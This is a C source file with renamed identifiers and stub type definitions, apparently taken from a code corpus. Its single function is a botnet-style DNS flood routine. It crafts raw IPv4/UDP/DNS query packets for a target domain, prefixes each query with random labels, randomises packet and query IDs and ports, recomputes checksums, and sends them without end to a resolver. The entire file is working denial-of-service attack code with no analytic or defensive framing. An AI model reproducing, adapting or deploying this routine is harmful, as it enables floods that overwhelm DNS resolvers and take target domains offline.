
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint16_t ;
struct udphdr {int source; int dest; void* len; scalar_t__ check; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; scalar_t__ check; void* daddr; int saddr; int protocol; void* frag_off; void* tot_len; } ;
struct dnshdr {int id; void* qdcount; void* opts; } ;
struct dns_question {void* qclass; void* qtype; } ;
struct TYPE_3__ {void* s_addr; } ;
struct TYPE_4__ {int sin_port; TYPE_1__ sin_addr; } ;
struct attack_target {TYPE_2__ sock_addr; } ;
struct attack_option {int dummy; } ;
typedef int port_t ;
typedef void* ipv4_t ;
typedef void* BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int VAR_13 ;
 int VAR_14 ;
 int VAR_15 ;
 int VAR_16 ;
 int VAR_17 ;
 int VAR_18 ;
 scalar_t__ VAR_19 ;
 void* FUNC_0 (int,struct attack_option*,int ,int) ;
 char* FUNC_1 (int,struct attack_option*,int ,int *) ;
 void* FUNC_2 (int,int) ;
 scalar_t__ FUNC_3 (int*,int) ;
 scalar_t__ FUNC_4 (struct iphdr*,struct udphdr*,void*,int) ;
 int FUNC_5 (int) ;
 scalar_t__ VAR_20 ;
 void* FUNC_6 () ;
 void* FUNC_7 (int) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (int*,int) ;
 int FUNC_10 () ;
 int FUNC_11 (int,char*,int,int ,struct sockaddr*,int) ;
 int FUNC_12 (int,int ,int ,int*,int) ;
 int FUNC_13 (int ,int ,int ) ;
 int FUNC_14 (char*,char*,int) ;
 int FUNC_15 (char*) ;

void FUNC_16(uint8_t VAR_21, struct attack_target *VAR_22, uint8_t VAR_23, struct attack_option *VAR_24)
{
    int VAR_25, VAR_26;
    char **VAR_27 = FUNC_2(VAR_21, sizeof (char *));
    uint8_t VAR_28 = FUNC_0(VAR_23, VAR_24, VAR_6, 0);
    uint16_t VAR_29 = FUNC_0(VAR_23, VAR_24, VAR_5, 0xffff);
    uint8_t VAR_30 = FUNC_0(VAR_23, VAR_24, VAR_7, 64);
    BOOL VAR_31 = FUNC_0(VAR_23, VAR_24, VAR_4, VAR_10);
    port_t VAR_32 = FUNC_0(VAR_23, VAR_24, VAR_9, 0xffff);
    port_t VAR_33 = FUNC_0(VAR_23, VAR_24, VAR_3, 53);
    uint16_t VAR_34 = FUNC_0(VAR_23, VAR_24, VAR_1, 0xffff);
    uint8_t VAR_35 = FUNC_0(VAR_23, VAR_24, VAR_8, 12);
    char *VAR_36 = FUNC_1(VAR_23, VAR_24, VAR_2, ((void*)0));
    int VAR_37;
    ipv4_t VAR_38 = FUNC_6();

    if (VAR_36 == ((void*)0))
    {



        return;
    }
    VAR_37 = FUNC_15(VAR_36);

    if ((VAR_26 = FUNC_13(VAR_0, VAR_18, VAR_12)) == -1)
    {



        return;
    }
    VAR_25 = 1;
    if (FUNC_12(VAR_26, VAR_11, VAR_13, &VAR_25, sizeof (int)) == -1)
    {



        FUNC_5(VAR_26);
        return;
    }

    for (VAR_25 = 0; VAR_25 < VAR_21; VAR_25++)
    {
        int VAR_39;
        uint8_t VAR_40 = 0, VAR_41 = 0;
        struct iphdr *VAR_42;
        struct udphdr *VAR_43;
        struct dnshdr *VAR_44;
        char *VAR_45, *VAR_46;
        struct dns_question *VAR_47;

        VAR_27[VAR_25] = FUNC_2(600, sizeof (char));
        VAR_42 = (struct iphdr *)VAR_27[VAR_25];
        VAR_43 = (struct udphdr *)(VAR_42 + 1);
        VAR_44 = (struct dnshdr *)(VAR_43 + 1);
        VAR_45 = (char *)(VAR_44 + 1);

        VAR_42->version = 4;
        VAR_42->ihl = 5;
        VAR_42->tos = VAR_28;
        VAR_42->tot_len = FUNC_7(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + VAR_35 + 2 + VAR_37 + sizeof (struct dns_question));
        VAR_42->id = FUNC_7(VAR_29);
        VAR_42->ttl = VAR_30;
        if (VAR_31)
            VAR_42->frag_off = FUNC_7(1 << 14);
        VAR_42->protocol = VAR_12;
        VAR_42->saddr = VAR_14;
        VAR_42->daddr = VAR_38;

        VAR_43->source = FUNC_7(VAR_32);
        VAR_43->dest = FUNC_7(VAR_33);
        VAR_43->len = FUNC_7(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + VAR_35 + 2 + VAR_37 + sizeof (struct dns_question));

        VAR_44->id = FUNC_7(VAR_34);
        VAR_44->opts = FUNC_7(1 << 8);
        VAR_44->qdcount = FUNC_7(1);


        *VAR_45++ = VAR_35;
        VAR_45 += VAR_35;

        VAR_46 = VAR_45;
        FUNC_14(VAR_45 + 1, VAR_36, VAR_37 + 1);


        for (VAR_39 = 0; VAR_39 < VAR_37; VAR_39++)
        {
            if (VAR_36[VAR_39] == '.')
            {
                *VAR_46 = VAR_40;
                VAR_40 = 0;
                VAR_41++;
                VAR_46 = VAR_45 + VAR_39 + 1;
            }
            else
                VAR_40++;
        }
        *VAR_46 = VAR_40;

        VAR_47 = (struct dns_question *)(VAR_45 + VAR_37 + 2);
        VAR_47->qtype = FUNC_7(VAR_17);
        VAR_47->qclass = FUNC_7(VAR_16);
    }

    while (VAR_19)
    {
        for (VAR_25 = 0; VAR_25 < VAR_21; VAR_25++)
        {
            char *VAR_48 = VAR_27[VAR_25];
            struct iphdr *VAR_49 = (struct iphdr *)VAR_48;
            struct udphdr *VAR_50 = (struct udphdr *)(VAR_49 + 1);
            struct dnshdr *VAR_51 = (struct dnshdr *)(VAR_50 + 1);
            char *VAR_52 = ((char *)(VAR_51 + 1)) + 1;

            if (VAR_29 == 0xffff)
                VAR_49->id = FUNC_10() & 0xffff;
            if (VAR_32 == 0xffff)
                VAR_50->source = FUNC_10() & 0xffff;
            if (VAR_33 == 0xffff)
                VAR_50->dest = FUNC_10() & 0xffff;

            if (VAR_34 == 0xffff)
                VAR_51->id = FUNC_10() & 0xffff;

            FUNC_9((uint8_t *)VAR_52, VAR_35);

            VAR_49->check = 0;
            VAR_49->check = FUNC_3((uint16_t *)VAR_49, sizeof (struct iphdr));

            VAR_50->check = 0;
            VAR_50->check = FUNC_4(VAR_49, VAR_50, VAR_50->len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + VAR_35 + 2 + VAR_37 + sizeof (struct dns_question));

            VAR_22[VAR_25].sock_addr.sin_addr.s_addr = VAR_38;
            VAR_22[VAR_25].sock_addr.sin_port = VAR_50->dest;
            FUNC_11(VAR_26, VAR_48, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + VAR_35 + 2 + VAR_37 + sizeof (struct dns_question), VAR_15, (struct sockaddr *)&VAR_22[VAR_25].sock_addr, sizeof (struct sockaddr_in));
        }





    }
}
